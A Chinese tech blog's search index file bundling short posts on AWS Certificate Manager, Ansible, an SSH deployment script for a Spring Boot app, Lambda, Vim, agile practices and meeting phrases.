是否会提供一个可以在我的网站上显示的安全站点签章或信任徽标？</p><p>不会。如果您想使用站点签章，您可以从第三方供应商处获得。我们建议选择可评估和维护您站点和/或业务实践的安全性的供应商。</p><p>问：亚马逊是否允许将其商标或徽标用作证书徽章、站点签章或信任徽标？</p><p>不允许。此类签章和徽章可复制到不使用 ACM 服务的站点，但不能假借亚马逊名号建立信任。为保护我们的客户和亚马逊的声誉，我们不允许以这种方式使用我们的徽标。</p><h3 id="日志记录"><a href="#日志记录" class="headerlink" title="日志记录"></a>日志记录</h3><p>问：AWS CloudTrail 提供哪些日志记录信息？</p><p>您可以确定哪些用户和账户为支持 AWS CloudTrail 的服务调用了 AWS API、发出调用的源 IP 地址以及调用发生的时间。例如，您可以确定哪些用户为关联 ACM 提供的证书与 Elastic Load Balancer 调用了 API，以及 Elastic Load Balancing 服务使用 KMS API 调用加密密钥的时间。</p><h3 id="托管更新与部署"><a href="#托管更新与部署" class="headerlink" title="托管更新与部署"></a>托管更新与部署</h3><p>问：什么是 ACM 托管更新与部署？</p><p>ACM 托管更新与部署可以管理由 ACM 提供的 SSL/TLS 证书的更新流程并部署更新后的证书。</p><p>问：使用 ACM 托管更新与部署有哪些优势？</p><p>ACM 可帮助您管理 SSL/TLS 证书的更新和部署。与容易出错的手动流程相比，ACM 能够让安全 Web 服务或应用程序的 SSL/TLS 配置和维护具有更高的操作可靠性。托管更新与部署有助于您避免因证书过期导致的停机。ACM 托管更新与部署不需要您在自己的站点安装或维护软件客户端或代理。ACM 会作为一种服务运行，并且与其他 AWS 服务集成。这意味着，您可以使用 AWS 管理控制台、AWS CLI 或 API 在 AWS 平台上集中管理和部署证书。</p><p>问：哪些证书可以自动更新和部署？</p><p>ACM 能够更新并部署 ACM 提供的证书，而无需域的所有者进行任何其他审批或介入。如果证书必须经过附加审批才能更新，ACM 会基于证书中的所有域名向相应域的所有者提出审批请求，以此管理更新流程。在证书中的所有域名均获得批准后，ACM 会更新证书并自动将其部署到您的 AWS 资源。如果域的所有者没有批准证书，我们会通知您 (AWS 账户所有者)。为了提高 ACM 自动更新和部署 ACM 提供的证书的能力，请确保证书正在使用，且证书中包括的所有域名均能解析至您的站点，并可通过 Internet 访问。<br>问：ACM 何时更新证书？</p><p>ACM 最早可在证书过期前 60 天开始执行更新流程。目前，ACM 提供的证书的验证期限是 13 个月。请参阅 ACM 用户指南，了解有关托管续订的更多信息。</p><p>问：在更新证书和部署新证书之前，我是否会收到通知？</p><p>不会。ACM 可能会在不提前通知的情况下更新证书或更新密钥，并更换旧的证书。</p><p>问：ACM 是否可以更新包含裸域 (也称为顶级域名，例如“example.com”) 的证书？</p><p>为了提高 ACM 自动更新和部署包含裸域的证书的能力，请确保裸域的 DNS 查找能够解析至与该证书关联的 AWS 资源。将裸域解析到 AWS 资源可能非常困难，除非您使用 Route 53 或支持别名资源记录 (或同类记录) 的其他 DNS 提供商，从而将裸域映射到 AWS 资源。有关更多信息，请参阅 Route 53 开发人员指南。</p><p>问：在 ACM 部署更新后的证书时，我的站点是否会断开现有连接？</p><p>不会。在部署新证书之后建立的连接将使用新证书，而现有连接不会受到影响。</p>]]></content>
      
      
      <categories>
          
          <category> 运维开发 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Ansible 入门和使用</title>
      <link href="/%E8%BF%90%E7%BB%B4%E5%BC%80%E5%8F%91/devops/ansible/"/>
      <url>/%E8%BF%90%E7%BB%B4%E5%BC%80%E5%8F%91/devops/ansible/</url>
      
        <content type="html"><![CDATA[<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><p>直接执行 ad-hoc 命令</p><blockquote><p>ansible [hosts] comamnd -a “echo xxx”;</p></blockquote><h2 id="相关资料"><a href="#相关资料" class="headerlink" title="相关资料"></a>相关资料</h2><ul><li>官网: <a href="https://www.ansible.com/get-started" target="_blank" rel="noopener">https://www.ansible.com/get-started</a></li><li>工作原理:<a href="https://www.ansible.com/how-ansible-works" target="_blank" rel="noopener">https://www.ansible.com/how-ansible-works</a></li><li>下载和安装:<a href="http://docs.ansible.com/ansible/latest/intro_installation.html" target="_blank" rel="noopener">http://docs.ansible.com/ansible/latest/intro_installation.html</a></li><li>编写自己的脚本:<a href="http://docs.ansible.com/ansible/latest/playbooks.html" target="_blank" rel="noopener">http://docs.ansible.com/ansible/latest/playbooks.html</a></li><li><p>一些ansible 例子:<a href="https://github.com/ansible/ansible-examples" target="_blank" rel="noopener">https://github.com/ansible/ansible-examples</a></p></li><li><p>使用ansible playbook部署LAMP<br><a href="https://github.com/ansible/ansible-examples/tree/master/lamp_simple" target="_blank" rel="noopener">https://github.com/ansible/ansible-examples/tree/master/lamp_simple</a></p></li><li><p>w3school 的一个教程 <a href="https://www.w3cschool.cn/automate_with_ansible/automate_with_ansible-db6727oq.html" target="_blank" rel="noopener">https://www.w3cschool.cn/automate_with_ansible/automate_with_ansible-db6727oq.html</a></p></li><li><p>我的常用脚本仓库 <a href="https://github.com/linksgo2011/deployment-automation" target="_blank" rel="noopener">https://github.com/linksgo2011/deployment-automation</a></p></li><li><p>ansible role 市场 <a href="https://galaxy.ansible.com/" target="_blank" rel="noopener">https://galaxy.ansible.com/</a>  </p></li></ul><h3 id="检查模式-“Dry-Run”"><a href="#检查模式-“Dry-Run”" class="headerlink" title="检查模式(“Dry Run”)"></a>检查模式(“Dry Run”)</h3><p>ansible version 1.1 后提供了一种dryrun环境，使得我们可以测试我们的脚本而不造成任何changes</p><p><a href="http://docs.ansible.com/ansible/latest/playbooks_checkmode.html#id1" target="_blank" rel="noopener">http://docs.ansible.com/ansible/latest/playbooks_checkmode.html#id1</a></p><p>Example:</p><pre><code>ansible-playbook foo.yml --check</code></pre><h3 id="Ansible-test"><a href="#Ansible-test" class="headerlink" title="Ansible test"></a>Ansible test</h3><p><a href="http://docs.ansible.com/ansible/latest/dev_guide/testing.html" target="_blank" rel="noopener">http://docs.ansible.com/ansible/latest/dev_guide/testing.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 运维开发 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>使用SSH实现自动化部署</title>
      <link href="/%E8%BF%90%E7%BB%B4%E5%BC%80%E5%8F%91/devops/auto%20deployment%20with%20ssh/"/>
      <url>/%E8%BF%90%E7%BB%B4%E5%BC%80%E5%8F%91/devops/auto%20deployment%20with%20ssh/</url>
      
        <content type="html"><![CDATA[<h2 id="相关解决方案"><a href="#相关解决方案" class="headerlink" title="相关解决方案"></a>相关解决方案</h2><p>在web项目中有时候，需要部署代码上线，因此有一些问题在于怎么自动化部署。通常的做法是使用CI/CD平台配合自定义的脚本来实现。</p><ul><li>对于PHP可以使用git、SVN直接同步代码，配合Puppet使用</li><li>Java和前端等项目可以使用包管理来发布</li></ul><h2 id="小型SSH部署代码实现"><a href="#小型SSH部署代码实现" class="headerlink" title="小型SSH部署代码实现"></a>小型SSH部署代码实现</h2><p>对于小型团队和自己的项目贴一段用SSH实现的Spring boot部署方案</p><p>SCP jar文件到远程服务器</p><pre><code class="shell">scp -i &quot;./.circleci/aws.pem&quot; whoisspy-0.0.1-SNAPSHOT.jar ubuntu@ec2-18-217-113-62.us-east-2.compute.amazonaws.com:/home/ubuntu/workspace/whoisspy-0.0.1-SNAPSHOT.jar</code></pre><p>kill原来的端口，然后启动新的进程</p><pre><code class="shell">ssh -i &quot;./.circleci/aws.pem&quot; ubuntu@ec2-18-217-113-62.us-east-2.compute.amazonaws.com &#39;ls            cd workspace            #kill old instance            output=$( netstat -apn | grep 8086 | grep LISTEN) &amp;&amp; read num1 num2 num3 num4 num5  &lt;&lt;&lt;${output//[^0-9]/ } &amp;&amp; kill -9 $num5 || pwd            # todo start new instance            java -jar whoisspy-0.0.1-SNAPSHOT.jar &gt; /dev/null 2&gt;&amp;1 &amp;            # test if it has been started            netstat -apn | grep 8086&#39;</code></pre><p>清理本地SSH链接</p><pre><code class="shell">pid=$( ps aux | grep amazonaws | awk &#39;{print $2}&#39; | sort -n | head -n 1 )leep 5 &amp;&amp; kill ${pid} &amp;&amp; echo &quot;ssh command is complete&quot;</code></pre><p>关于怎么远程执行命令并合理退出，参考了文章：<a href="http://blog.csdn.net/fdipzone/article/details/23000201" target="_blank" rel="noopener">http://blog.csdn.net/fdipzone/article/details/23000201</a></p>]]></content>
      
      
      <categories>
          
          <category> 运维开发 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Lambda 入门</title>
      <link href="/%E8%BF%90%E7%BB%B4%E5%BC%80%E5%8F%91/devops/aws%20lambda/"/>
      <url>/%E8%BF%90%E7%BB%B4%E5%BC%80%E5%8F%91/devops/aws%20lambda/</url>
      
        <content type="html"><![CDATA[<h2 id="相关资源"><a href="#相关资源" class="headerlink" title="相关资源"></a>相关资源</h2><p>Official website:<br><a href="http://docs.aws.amazon.com/zh_cn/lambda/latest/dg/lambda-app.html" target="_blank" rel="noopener">http://docs.aws.amazon.com/zh_cn/lambda/latest/dg/lambda-app.html</a></p><p>A video tutorial:<br><a href="https://www.lynda.com/Amazon-Web-Services-tutorials/Serverless-architectures-AWS-Lambda/569195/617984-4.html?srchtrk=index%3a3%0alinktypeid%3a2%0aq%3alambda+aws%0apage%3a1%0as%3arelevance%0asa%3atrue%0aproducttypeid%3a2" target="_blank" rel="noopener">https://www.lynda.com/Amazon-Web-Services-tutorials/Serverless-architectures-AWS-Lambda/569195/617984-4.html?srchtrk=index%3a3%0alinktypeid%3a2%0aq%3alambda+aws%0apage%3a1%0as%3arelevance%0asa%3atrue%0aproducttypeid%3a2</a></p><h2 id="什么是Lambda？"><a href="#什么是Lambda？" class="headerlink" title="什么是Lambda？"></a>什么是Lambda？</h2><p>AWS Lambda 是一项计算服务，可使您无需预配置或管理服务器即可运行代码。AWS Lambda 只在需要时执行您的代码并自动缩放，从每天几个请求到每秒数千个请求。您只需按消耗的计算时间付费 – 代码未运行时不产生费用。借助 AWS Lambda，您几乎可以为任何类型的应用程序或后端服务运行代码，而且无需执行任何管理。AWS Lambda 在可用性高的计算基础设施上运行您的代码，执行计算资源的所有管理工作，其中包括服务器和操作系统维护、容量预置和自动扩展、代码监控和记录。您只需要以 AWS Lambda 支持的一种语言 (目前为 Node.js、Java、C# 和 Python) 提供您的代码。</p><h2 id="为什么需要学习它？"><a href="#为什么需要学习它？" class="headerlink" title="为什么需要学习它？"></a>为什么需要学习它？</h2><p>Lambda 提供了一种与环境无关的代码执行平台，更加灵活去使用</p><h2 id="这项技术定位"><a href="#这项技术定位" class="headerlink" title="这项技术定位"></a>这项技术定位</h2><p>新技术可以用在私人或者试用项目中，产品环境暂时不推荐使用，类似于BAE等平台</p><h2 id="Scope"><a href="#Scope" class="headerlink" title="Scope"></a>Scope</h2><p>实际上Lambda 包含了函数和事件系统。在AWS中可以设定各种不同的事件源来trigger我们的Lambda函数</p><h2 id="构建-Lambda-函数"><a href="#构建-Lambda-函数" class="headerlink" title="构建 Lambda 函数"></a>构建 Lambda 函数</h2><p>Lambda函数可以在本地开发环境中开发，然后上传到AWS平台上运行。目前AWS支持四种编程语言：</p><ul><li>Nodejs</li><li>Java</li><li>Python</li><li>C#</li></ul><p>编写相关的程序需要遵守一些基本程序结构，因此AWS能解析并执行。</p><p>## </p>]]></content>
      
      
      <categories>
          
          <category> 运维开发 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>VIM 简明命令</title>
      <link href="/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/tool/vim-commands/"/>
      <url>/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/tool/vim-commands/</url>
      
        <content type="html"><![CDATA[<p><img src="/开发工具/tool/vim-commands/vi-vim-cheat-sheet-sch.gif" alt=""></p><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><ul><li>ESC 健进入命令模式</li><li>i/a 进入插入模式</li><li>:/ 进入退出模式</li></ul><h2 id="命令模式"><a href="#命令模式" class="headerlink" title="命令模式"></a>命令模式</h2><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://www.runoob.com/linux/linux-vim.html" target="_blank" rel="noopener">https://www.runoob.com/linux/linux-vim.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 开发工具 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>常用开源项目收集</title>
      <link href="/%E8%87%AA%E6%88%91%E7%AE%A1%E7%90%86/self-management/common-tools/"/>
      <url>/%E8%87%AA%E6%88%91%E7%AE%A1%E7%90%86/self-management/common-tools/</url>
      
        <content type="html"><![CDATA[<p><a href="http://veyon.io/#" target="_blank" rel="noopener">http://veyon.io/#</a></p><p>非常不错的开源教学软件</p><p><img src="http://veyon.io/img/veyon-features.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 自我管理 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>一个敏捷项目需要的相关技术实践</title>
      <link href="/%E6%95%8F%E6%8D%B7%E5%BC%80%E5%8F%91/agile/ecosystem-for-project/"/>
      <url>/%E6%95%8F%E6%8D%B7%E5%BC%80%E5%8F%91/agile/ecosystem-for-project/</url>
      
        <content type="html"><![CDATA[<p>一个项目可以做的很完善,也可以做的很简单,这篇文章就是总结了一个清单,来讨论我们在一个敏捷项目中可以做的比较完善的东西,比如CI/CD</p><h2 id="质量内建"><a href="#质量内建" class="headerlink" title="质量内建"></a>质量内建</h2><ol><li>Check style - 代码风格检查</li><li>Test coverage - 测试覆盖率</li><li>fortify - Java代码静态分析</li><li>TDD - 测试驱动开发</li><li>Eslint - 前端代码检查</li></ol><h2 id="安全"><a href="#安全" class="headerlink" title="安全"></a>安全</h2><ol><li>Penetration - 渗透测试</li></ol><h2 id="工作方式"><a href="#工作方式" class="headerlink" title="工作方式"></a>工作方式</h2><ol><li>CI/CD 持续部署</li><li>Git Flow - 基于git的团队协作方式</li><li>Retro - 敏捷中反思项目的会议</li></ol><h2 id="监控恢复"><a href="#监控恢复" class="headerlink" title="监控恢复"></a>监控恢复</h2><ol><li>monitoring<ul><li>Ahportal - 一种监控的实现方式</li></ul></li><li>DR - 灾难恢复方案</li></ol><h2 id="度量"><a href="#度量" class="headerlink" title="度量"></a>度量</h2><ol><li>CPU、内存、磁盘使用率</li><li>Max request量</li><li>AB 测试</li></ol><h2 id="环境管理"><a href="#环境管理" class="headerlink" title="环境管理"></a>环境管理</h2><ol><li>infrastructure as code - 根据项目代码创建基础设施</li><li>immutable infrastructure - 每次部署创建新的服务器</li><li>DB migration</li></ol><h2 id="分布式解耦"><a href="#分布式解耦" class="headerlink" title="分布式解耦"></a>分布式解耦</h2><ol><li>micro-service 微服务</li><li>SPA Project - 前后端分离</li></ol><h2 id="发布"><a href="#发布" class="headerlink" title="发布"></a>发布</h2><ol><li>Blue-Green - 蓝绿部署</li><li>Gray - 灰度发布</li></ol>]]></content>
      
      
      <categories>
          
          <category> 敏捷开发 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>项目移交检查清单</title>
      <link href="/%E8%81%8C%E4%B8%9A%E7%B4%A0%E8%B4%A8/profession/wa-of-working-for-handover/"/>
      <url>/%E8%81%8C%E4%B8%9A%E7%B4%A0%E8%B4%A8/profession/wa-of-working-for-handover/</url>
      
        <content type="html"><![CDATA[<h4 id="What-we-can-do-fo-that"><a href="#What-we-can-do-fo-that" class="headerlink" title="What we can do fo that?"></a>What we can do fo that?</h4><ul><li>整理一个清单</li><li>建立一个文档去跟踪</li><li>安排一些conversation去移交</li><li>review 那些东西已经被确认接受</li><li>角色对角色, QA、DEV、BA分别处理</li><li>定义移交scope</li><li>定义deadline</li></ul>]]></content>
      
      
      <categories>
          
          <category> 职业素质 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>敏捷开发的基本流程</title>
      <link href="/%E6%95%8F%E6%8D%B7%E5%BC%80%E5%8F%91/agile/agile-basic-work-flow/"/>
      <url>/%E6%95%8F%E6%8D%B7%E5%BC%80%E5%8F%91/agile/agile-basic-work-flow/</url>
      
        <content type="html"><![CDATA[<h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>敏捷开发流程中的一些很好的工作方式，本文中使用的敏捷方法为 Scrum</p><h2 id="建卡"><a href="#建卡" class="headerlink" title="建卡"></a>建卡</h2><p>BA 负责建 story 卡，如果其他人需要建立卡片，需要告知 BA</p><h2 id="需求澄清（three-amigos）"><a href="#需求澄清（three-amigos）" class="headerlink" title="需求澄清（three amigos）"></a>需求澄清（three amigos）</h2><p>BA DEV QA 三方 catchup ，澄清卡的需求，然后 BA 移动到当前迭代</p><h2 id="工作量估算（estimation）"><a href="#工作量估算（estimation）" class="headerlink" title="工作量估算（estimation）"></a>工作量估算（estimation）</h2><p>BA 发起全员来进行估算工作量，并澄清需求</p><p>估点数量按照斐波那契数列例如 1 2 3 5，超过 5 个点的卡需要被拆分</p><h2 id="移动任务到待开发-（ready-for-dev）"><a href="#移动任务到待开发-（ready-for-dev）" class="headerlink" title="移动任务到待开发 （ready for dev）"></a>移动任务到待开发 （ready for dev）</h2><p>BA 把卡移动到 ready for dev，然后开发就可以开始工作</p><h2 id="开发中-（development）"><a href="#开发中-（development）" class="headerlink" title="开发中 （development）"></a>开发中 （development）</h2><p>Dev 需要和 BA、QA 领卡，kick off 然后开始工作，每个卡需要建立一个branch，完成工作后需要检查 pipeline 是否通过然后，创建 Pull request，然后该卡可以移动到 review</p><h2 id="审查-（Review）"><a href="#审查-（Review）" class="headerlink" title="审查 （Review）"></a>审查 （Review）</h2><p>Review 环节需要找人 approve PR</p><h2 id="移动任务到待测试-（Ready-for-test）"><a href="#移动任务到待测试-（Ready-for-test）" class="headerlink" title="移动任务到待测试 （Ready for test）"></a>移动任务到待测试 （Ready for test）</h2><p>合并代码到 master，和 QA sign off 后移动故事卡到 Ready for test</p>]]></content>
      
      
      <categories>
          
          <category> 敏捷开发 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>How to end a meeting?</title>
      <link href="/%E8%81%8C%E4%B8%9A%E7%B4%A0%E8%B4%A8/profession/how-to-wrap-up/"/>
      <url>/%E8%81%8C%E4%B8%9A%E7%B4%A0%E8%B4%A8/profession/how-to-wrap-up/</url>
      
        <content type="html"><![CDATA[<h2 id="some-of-usages"><a href="#some-of-usages" class="headerlink" title="some of usages"></a>some of usages</h2><ul><li>“any questions”</li><li>“any comments”</li><li>“any other updates”</li></ul><h2 id="Summarize"><a href="#Summarize" class="headerlink" title="Summarize"></a>Summarize</h2><ul><li>“Today we have covered”</li><li>“in this meeting we have discussed”</li><li>“The main points that I’d like to sum up are”</li><li>“To summarize today’s meeting”</li><li>“Let me summarize what we have talked about today before we finish”</li></ul><h2 id="重点单词"><a href="#重点单词" class="headerlink" title="重点单词"></a>重点单词</h2><ul><li>Sum up 口语上的summarize</li><li>Recap 复盘，重述</li></ul><h2 id="End"><a href="#End" class="headerlink" title="End"></a>End</h2><p>express the time run out of time</p><ul><li>it seems as though we’ve run out of time for today</li><li>Unfortunately we are out of time </li></ul><p>express to close a meeting </p><ul><li>Let’s call a day</li><li>Let’s wrap up</li><li>that’s all for our meeting</li></ul>]]></content>
      
      
      <categories>
          
          <category> 职业素质 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>怎么样快速入门/学习一项技术</title>
      <link href="/%E8%87%AA%E6%88%91%E7%AE%A1%E7%90%86/self-management/How%20to%20learn%20something%20quickly/"/>
      <url>/%E8%87%AA%E6%88%91%E7%AE%A1%E7%90%86/self-management/How%20to%20learn%20something%20quickly/</url>
      
        <content type="html"><![CDATA[<h2 id="技术类知识学习的流程"><a href="#技术类知识学习的流程" class="headerlink" title="技术类知识学习的流程"></a>技术类知识学习的流程</h2><ol><li>回答几个问题<ul><li>这项技术是什么？</li><li>这项技术的意义？</li><li>这项技术的定位？</li><li>为什么需要学习这项技术  </li></ul></li><li>收集入门教程</li><li>阅读入门教程产出笔记或者思维导图</li><li>使用小项目练习</li><li>阅读官方文档了解更多</li><li>搞懂原理（可选）</li></ol><h2 id="学习一门新技术的要点"><a href="#学习一门新技术的要点" class="headerlink" title="学习一门新技术的要点"></a>学习一门新技术的要点</h2><ul><li>咨询有经验的人，需要提前准备问题，寻求一些好的资料和书籍</li><li>阅读速度不宜过快，安排大块时间。step by step</li><li>一定要有产出</li><li>编写文档到知识系统中</li></ul>]]></content>
      
      
      <categories>
          
          <category> 自我管理 </category>
          
      </categories>
      
      
    </entry>
    
  
  
</search>
